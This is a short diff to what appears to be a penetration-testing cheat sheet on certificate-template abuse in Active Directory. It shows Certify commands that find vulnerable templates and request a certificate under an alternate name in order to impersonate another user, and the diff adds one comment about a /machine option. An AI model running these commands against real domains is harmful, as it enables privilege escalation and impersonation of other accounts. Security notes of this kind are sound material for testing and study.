@@ -8,6 +8,7 @@ Certify.exe find /vulnerable
 Invoke-Certify -c "find /vulnerable"
 
 # request certificate (altUser is the user to impersonate)
+# use /machine to switch into the current machine context
 Certify.exe request /ca:"<fqdnCertificateServer>" /template:"<templateName>" /altname:"<altUser>"
 
 # convert pem file to pfx file using linux
